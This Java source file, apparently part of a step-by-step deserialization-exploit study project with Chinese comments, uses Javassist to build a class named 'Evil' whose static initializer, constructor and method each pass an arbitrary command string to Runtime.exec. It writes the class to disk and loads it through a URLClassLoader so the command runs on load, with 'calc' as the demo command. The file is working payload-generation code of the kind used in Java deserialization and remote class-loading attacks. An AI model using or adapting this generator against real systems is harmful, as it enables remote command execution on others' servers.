package Step6EvilClass;
import java.io.File;
import java.net.URL;
import java.net.URLClassLoader;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtField;
import javassist.CtMethod;
import javassist.CtNewMethod;
import javassist.bytecode.AccessFlag;

public class createEvilClass {
	
	public static byte[] create(String cmd) {
		
		ClassPool pool = ClassPool.getDefault();
		//会从classpath中查询该类
		CtClass evilclass = pool.makeClass("Evil");
		try {
			CtField f= new CtField(CtClass.intType,"id",evilclass);//获得一个类型为int，名称为id的字段
			f.setModifiers(AccessFlag.PUBLIC);//将字段设置为public
			evilclass.addField(f);//将字段设置到类上
			
			//添加静态代码块
			CtConstructor ci = evilclass.makeClassInitializer();
			ci.setBody("{try{Runtime.getRuntime().exec(\""+cmd+"\");}catch(Exception e){e.printStackTrace();}}");
			 
			//添加构造函数
			CtConstructor ctConstructor1 = new CtConstructor(new CtClass[]{}, evilclass);//指定参数构造器
	        ctConstructor1.setBody("{try{Runtime.getRuntime().exec(\""+cmd+"\");}catch(Exception e){e.printStackTrace();}}");//$1代表第一个参数，$2代表第二个参数，$0代表this
			evilclass.addConstructor(ctConstructor1);
			
			//添加方法
			CtMethod helloM=CtNewMethod.make("public void fun(){try{Runtime.getRuntime().exec(\""+cmd+"\");}catch(Exception e){e.printStackTrace();}}",evilclass);
			evilclass.addMethod(helloM);
			
			evilclass.writeFile("D:\\");//将生成的.class文件保存到磁盘
			byte[] b=evilclass.toBytecode();
			
			return b;
		}catch(Exception e) {
			e.printStackTrace();
		}
		return null;
	}
	
	public static void main(String[] args) {

		
/*		//从本地或者网络加载类
		try {
			File file = new File("D:\\");
			URL url = file.toURL();
			URL[] urls = new URL[]{url};
			ClassLoader cl = new URLClassLoader(urls);
			Class cls = cl.loadClass("Evil");
			cls.newInstance();
			//
			
			
		} catch (Exception e) {
			e.printStackTrace();
		}*/
		
		
		try {
			File file = new File("D:\\");
			URL url = file.toURL();
			URL[] urls = new URL[]{url};
			ClassLoader cl = new URLClassLoader(urls);
			Class yyy = Class.forName("Evil",true,cl);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		
		byte[] st = createEvilClass.create("calc");
	}

}
